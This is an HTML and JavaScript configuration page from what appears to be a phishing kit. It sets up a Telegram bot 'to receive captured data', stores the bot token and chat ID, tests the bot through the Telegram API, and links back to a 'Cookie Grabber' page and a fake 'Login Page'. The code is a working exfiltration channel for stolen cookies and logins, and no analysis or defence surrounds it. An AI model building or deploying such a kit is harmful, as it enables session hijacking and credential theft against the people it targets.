<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Configuration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .config-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            text-align: center;
        }

        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e1e5e9;
            border-radius: 6px;
            font-size: 15px;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .help-text {
            font-size: 13px;
            color: #666;
            margin-top: 6px;
        }

        .help-text a {
            color: #667eea;
            text-decoration: none;
        }

        .help-text a:hover {
            text-decoration: underline;
        }

        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 30px;
        }

        button {
            flex: 1;
            padding: 14px 24px;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        #saveBtn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }

        #saveBtn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
        }

        #testBtn {
            background: #f8f9fa;
            color: #333;
            border: 2px solid #e1e5e9;
        }

        #testBtn:hover {
            background: #e9ecef;
        }

        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            display: none;
            text-align: center;
            font-weight: 500;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .telegram-icon {
            text-align: center;
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .back-button {
            display: block;
            margin-top: 20px;
            text-align: center;
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
            padding: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        
        .back-button:hover {
            background: #f0f2ff;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="config-container">
        <div class="telegram-icon">📱</div>
        <h1>Telegram Configuration</h1>
        <p class="subtitle">Configure your Telegram bot to receive captured data</p>
        
        <div class="form-group">
            <label for="botToken">Bot Token</label>
            <input type="text" id="botToken" placeholder="Enter your Telegram bot token">
            <div class="help-text">
                Get this from <a href="https://t.me/BotFather" target="_blank">@BotFather</a> when you create a new bot
            </div>
        </div>

        <div class="form-group">
            <label for="chatId">Chat ID</label>
            <input type="text" id="chatId" placeholder="Enter your Telegram chat ID">
            <div class="help-text">
                Get your chat ID by sending a message to your bot and visiting: 
                <code>https://api.telegram.org/bot&lt;token&gt;/getUpdates</code>
            </div>
        </div>

        <div class="button-group">
            <button id="testBtn" type="button">Test Connection</button>
            <button id="saveBtn" type="button">Save Configuration</button>
        </div>
        
        <a href="cookie-grabber.html" class="back-button">← Back to Cookie Grabber</a>
        <a href="index.html" class="back-button">← Back to Login Page</a>

        <div id="status" class="status"></div>
    </div>

    <script>
        // ===================== SIMPLIFIED TELEGRAM CONFIG MANAGER =====================
        class TelegramConfig {
            constructor() {
                this.botToken = '';
                this.chatId = '';
                this.loadConfiguration();
                this.bindEvents();
            }

            loadConfiguration() {
                const savedConfig = localStorage.getItem('telegramConfig');
                if (savedConfig) {
                    try {
                        const config = JSON.parse(savedConfig);
                        document.getElementById('botToken').value = config.botToken || '';
                        document.getElementById('chatId').value = config.chatId || '';
                    } catch (e) {
                        console.error('Error loading config:', e);
                    }
                }
            }

            saveConfiguration() {
                this.botToken = document.getElementById('botToken').value.trim();
                this.chatId = document.getElementById('chatId').value.trim();

                if (!this.botToken || !this.chatId) {
                    this.showStatus('Please fill in all fields', 'error');
                    return false;
                }

                const config = {
                    botToken: this.botToken,
                    chatId: this.chatId,
                    lastUpdated: new Date().toISOString()
                };

                localStorage.setItem('telegramConfig', JSON.stringify(config));
                this.showStatus('✅ Configuration saved successfully!', 'success');
                return true;
            }

            async testConnection() {
                if (!this.saveConfiguration()) {
                    return;
                }

                try {
                    const response = await fetch(`https://api.telegram.org/bot${this.botToken}/getMe`);
                    const data = await response.json();
                    
                    if (data.ok) {
                        this.showStatus(`✅ Bot connection successful! Bot name: ${data.result.first_name}`, 'success');
                    } else {
                        this.showStatus('❌ Invalid bot token', 'error');
                    }
                } catch (error) {
                    this.showStatus('❌ Connection test failed. Check your bot token.', 'error');
                }
            }

            showStatus(message, type) {
                const statusEl = document.getElementById('status');
                statusEl.textContent = message;
                statusEl.className = `status ${type}`;
                statusEl.style.display = 'block';

                setTimeout(() => {
                    statusEl.style.display = 'none';
                }, 5000);
            }

            bindEvents() {
                document.getElementById('saveBtn').addEventListener('click', () => {
                    this.saveConfiguration();
                });

                document.getElementById('testBtn').addEventListener('click', () => {
                    this.testConnection();
                });

                // Auto-save when inputs change
                document.getElementById('botToken').addEventListener('change', () => {
                    this.saveConfiguration();
                });

                document.getElementById('chatId').addEventListener('change', () => {
                    this.saveConfiguration();
                });
            }

            // Method to get configuration for use in main app
            static getConfig() {
                const savedConfig = localStorage.getItem('telegramConfig');
                return savedConfig ? JSON.parse(savedConfig) : null;
            }
        }

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', () => {
            new TelegramConfig();
        });
    </script>
</body>
</html>
